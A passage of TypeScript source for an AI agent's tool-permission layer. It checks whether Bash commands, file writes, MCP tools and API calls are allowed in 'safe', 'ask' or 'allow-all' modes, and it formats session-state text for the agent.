 * Check if a Bash command is read-only using a custom config.
 * Exported for testing purposes.
 *
 * @param command - The bash command to check
 * @param config - Tool check configuration with patterns
 * @returns true if command is safe to run in read-only mode
 */
export function isReadOnlyBashCommandWithConfig(command: string, config: ToolCheckConfig): boolean {
  // Use getBashRejectionReason which now uses AST-based validation
  // If no rejection reason, command is safe
  const rejection = getBashRejectionReason(command, config);
  return rejection === null;
}

/**
 * Check if a Bash command is read-only using the default safe mode config.
 * Exported for testing.
 *
 * @param command - The bash command to check
 * @returns true if command is safe to run in read-only mode
 */
export function isReadOnlyBashCommand(command: string): boolean {
  return isReadOnlyBashCommandWithConfig(command, SAFE_MODE_CONFIG);
}

/**
 * Check if an MCP tool is read-only using the given config
 */
function isReadOnlyMcpToolWithConfig(toolName: string, config: ToolCheckConfig): boolean {
  return config.readOnlyMcpPatterns.some(pattern => pattern.test(toolName));
}

/**
 * Check if an API call is allowed using the given config
 * Checks fine-grained endpoint rules (method + path pattern)
 */
function isApiCallAllowedWithConfig(method: string, path: string | undefined, config: ToolCheckConfig): boolean {
  const upperMethod = method.toUpperCase();

  // GET is always allowed
  if (upperMethod === 'GET') return true;

  // Check fine-grained endpoint rules (if path is available)
  if (path && config.allowedApiEndpoints) {
    for (const rule of config.allowedApiEndpoints) {
      if (rule.method === upperMethod && rule.pathPattern.test(path)) {
        return true;
      }
    }
  }

  return false;
}

/**
 * Check if an API endpoint is allowed based on permissions context.
 * Used in 'ask' mode to auto-allow whitelisted API endpoints from permissions.json.
 *
 * @param method - HTTP method (GET, POST, etc.)
 * @param path - API endpoint path
 * @param permissionsContext - Context for loading custom permissions
 * @returns true if endpoint is allowed (GET or matches allowedApiEndpoints rules)
 */
export function isApiEndpointAllowed(
  method: string,
  path: string | undefined,
  permissionsContext?: PermissionsContext
): boolean {
  let config: ToolCheckConfig;

  if (permissionsContext) {
    // Lazy import to avoid circular dependency
    const { permissionsConfigCache } = require('./permissions-config.ts');
    config = permissionsConfigCache.getMergedConfig(permissionsContext);
  } else {
    config = SAFE_MODE_CONFIG;
  }

  return isApiCallAllowedWithConfig(method, path, config);
}

/**
 * Tools that are always allowed in any mode (read-only by nature)
 */
const ALWAYS_ALLOWED_TOOLS = new Set([
  'Read', 'Glob', 'Grep',           // File reading
  'Task', 'TaskOutput',             // Agent orchestration
  'WebFetch', 'WebSearch',          // Web research
  'TodoWrite',                       // Task tracking
  'SubmitPlan',                     // Plan submission
  'LSP',                            // Language server (read-only)
]);

/**
 * Result type for tool permission checks
 */
export type ToolCheckResult =
  | { allowed: true; requiresPermission?: false }
  | { allowed: true; requiresPermission: true; description: string }
  | { allowed: false; reason: string };

/**
 * Centralized check: should a tool be allowed based on permission mode?
 *
 * This is the single source of truth for tool permissions.
 * Returns different results based on the permission mode:
 * - 'safe': Block writes entirely (no prompting)
 * - 'ask': Allow but may require permission for dangerous operations
 * - 'allow-all': Allow everything
 */
export function shouldAllowToolInMode(
  toolName: string,
  toolInput: unknown,
  mode: PermissionMode,
  options?: {
    plansFolderPath?: string;
    permissionsContext?: PermissionsContext;
  }
): ToolCheckResult {
  // Get config: merged custom if context provided, otherwise defaults
  let config: ToolCheckConfig;

  if (options?.permissionsContext) {
    // Lazy import to avoid circular dependency
    const { permissionsConfigCache } = require('./permissions-config.ts');
    config = permissionsConfigCache.getMergedConfig(options.permissionsContext);
  } else {
    config = SAFE_MODE_CONFIG;
  }

  // In 'allow-all' mode, all tools are allowed (no restrictions)
  if (mode === 'allow-all') {
    return { allowed: true };
  }

  // In 'ask' mode, all tools are allowed (user will be prompted for confirmation)
  if (mode === 'ask') {
    return { allowed: true };
  }

  // Safe mode: check against read-only allowlist

  // Always-allowed tools (read-only by nature)
  if (ALWAYS_ALLOWED_TOOLS.has(toolName)) {
    return { allowed: true };
  }

  // Check if tool name ends with an always-allowed tool (for MCP variants like mcp__plan__SubmitPlan)
  for (const allowedTool of ALWAYS_ALLOWED_TOOLS) {
    if (toolName.endsWith(`__${allowedTool}`)) {
      return { allowed: true };
    }
  }

  // Handle Bash - check if command is read-only
  // Uses detailed rejection reasons to provide helpful error messages
  if (toolName === 'Bash') {
    const input = toolInput as Record<string, unknown> | null;
    const command = input?.command;
    if (typeof command === 'string') {
      const rejection = getBashRejectionReason(command, config);
      if (!rejection) {
        // Command is safe - no rejection reason means it passed all checks
        return { allowed: true };
      }
      // Return detailed error message explaining exactly why the command was blocked
      return {
        allowed: false,
        reason: formatBashRejectionMessage(rejection, config),
      };
    }
    // No command provided - block with generic message
    return {
      allowed: false,
      reason: `Bash command is missing or invalid. Switch to Ask or Allow All mode (${config.shortcutHint}) to run it.`,
    };
  }

  // Handle Write/Edit/MultiEdit/NotebookEdit - allow if targeting plans folder or allowedWritePaths
  if (toolName === 'Write' || toolName === 'Edit' || toolName === 'MultiEdit' || toolName === 'NotebookEdit') {
    const input = toolInput as Record<string, unknown> | null;
    const filePath = (input?.file_path ?? input?.notebook_path) as string | undefined;

    if (filePath) {
      // Check plans folder exception
      if (options?.plansFolderPath) {
        const normalizedPath = filePath.replace(/\\/g, '/');
        const normalizedPlansDir = options.plansFolderPath.replace(/\\/g, '/');
        debug(`[Mode] Checking plans folder exception: path="${normalizedPath}", plansDir="${normalizedPlansDir}"`);

        if (normalizedPath.startsWith(normalizedPlansDir)) {
          debug(`[Mode] Allowing ${toolName} to plans folder`);
          return { allowed: true };
        }
      }

      // Check allowedWritePaths from permissions config
      if (config.allowedWritePaths && config.allowedWritePaths.length > 0) {
        if (matchesAllowedWritePath(filePath, config.allowedWritePaths)) {
          debug(`[Mode] Allowing ${toolName} via allowedWritePaths`);
          return { allowed: true };
        }
      }
    }
  }

  // Blocked tools (Write, Edit, MultiEdit, NotebookEdit)
  if (config.blockedTools.has(toolName)) {
    return {
      allowed: false,
      reason: getBlockReasonWithConfig(toolName, config)
    };
  }

  // Handle MCP tools - allow read-only, block write operations
  if (toolName.startsWith('mcp__')) {
    // Always allow preferences and documentation tools (read-only, always available)
    if (toolName.startsWith('mcp__preferences__') || toolName.startsWith('mcp__craft-agents-docs__')) {
      return { allowed: true };
    }

    // Handle session-scoped tools - allow read-only, block mutations
    if (toolName.startsWith('mcp__session__')) {
      // Read-only session tools - always allowed
      const readOnlySessionTools = [
        'mcp__session__SubmitPlan',
        'mcp__session__config_validate',
        'mcp__session__source_test',
      ];
      if (readOnlySessionTools.includes(toolName)) {
        return { allowed: true };
      }

      // Write session tools - blocked in safe mode
      return {
        allowed: false,
        reason: `Session configuration changes are blocked in ${config.displayName}. Switch to Ask or Allow All mode (${config.shortcutHint}) to create, update, or delete sources and agents.`
      };
    }

    // Handle API tools exposed via MCP (mcp__<source>__api_<name>)
    // These need endpoint-level permission checks, not just MCP read-only patterns
    if (toolName.includes('__api_')) {
      const input = toolInput as Record<string, unknown> | null;
      const method = (input?.method as string) || 'GET';
      const path = input?.path as string | undefined;
      if (isApiCallAllowedWithConfig(method, path, config)) {
        return { allowed: true };
      }
      return {
        allowed: false,
        reason: `API ${method} ${path ?? ''} is blocked in ${config.displayName}. Switch to Ask or Allow All mode (${config.shortcutHint}) to make changes.`
      };
    }

    if (isReadOnlyMcpToolWithConfig(toolName, config)) {
      return { allowed: true };
    }
    return {
      allowed: false,
      reason: `MCP write operations are blocked in ${config.displayName}. Switch to Ask or Allow All mode (${config.shortcutHint}) to make changes.`
    };
  }

  // Handle API tools - allow GET, block mutations unless endpoint is whitelisted
  if (toolName.startsWith('api_')) {
    const input = toolInput as Record<string, unknown> | null;
    const method = (input?.method as string) || 'GET';
    const path = input?.path as string | undefined;
    if (isApiCallAllowedWithConfig(method, path, config)) {
      return { allowed: true };
    }
    return {
      allowed: false,
      reason: `API ${method} ${path ?? ''} is blocked in ${config.displayName}. Switch to Ask or Allow All mode (${config.shortcutHint}) to make changes.`
    };
  }

  // Default: allow other tools not explicitly handled
  return { allowed: true };
}

/**
 * Get a user-friendly message explaining why a tool is blocked (using config)
 */
function getBlockReasonWithConfig(toolName: string, config: ToolCheckConfig): string {
  const displayName = config.displayName;
  const shortcut = config.shortcutHint;

  if (toolName === 'Bash') {
    return `Bash commands are blocked in ${displayName}. Switch to Ask or Allow All mode (${shortcut}) to run commands.`;
  }
  if (toolName === 'Write' || toolName === 'Edit' || toolName === 'MultiEdit') {
    return `File modifications are blocked in ${displayName}. Switch to Ask or Allow All mode (${shortcut}) to make changes.`;
  }
  if (toolName.startsWith('mcp__')) {
    return `MCP write operations are blocked in ${displayName}. Switch to Ask or Allow All mode (${shortcut}) to make changes.`;
  }
  if (toolName.startsWith('api_')) {
    return `API mutations are blocked in ${displayName}. Switch to Ask or Allow All mode (${shortcut}) to make changes.`;
  }
  return `${toolName} is blocked in ${displayName}. Switch to Ask or Allow All mode (${shortcut}) to use this tool.`;
}

/**
 * Create a hook return value that blocks a tool.
 * Returns the correct SDK format for PreToolUse hook blocking.
 *
 * @param reason - The reason for blocking (from shouldAllowToolInMode)
 */
export function blockWithReason(reason: string) {
  return {
    continue: false,
    decision: 'block' as const,
    reason,
  };
}

// ============================================================
// Session State Context (for user messages)
// ============================================================

/**
 * Get the current session state for prompt injection
 */
export function getSessionState(sessionId: string): { permissionMode: PermissionMode } {
  return {
    permissionMode: getPermissionMode(sessionId),
  };
}

/**
 * Format session state as a lightweight XML block for injection into user messages.
 * Always includes the plans folder path so agent knows where plans are stored.
 */
export function formatSessionState(
  sessionId: string,
  options?: { plansFolderPath?: string }
): string {
  const mode = getPermissionMode(sessionId);

  // Use the display name (lowercased) so the agent sees "explore" instead of internal key "safe"
  const modeName = PERMISSION_MODE_CONFIG[mode].displayName.toLowerCase();
  let result = `<session_state>\nsessionId: ${sessionId}\npermissionMode: ${modeName}`;

  // Always include plans folder path so agent knows where plans are stored
  if (options?.plansFolderPath) {
    result += `\nplansFolderPath: ${options.plansFolderPath}`;
  }

  result += '\n</session_state>';
  return result;
}
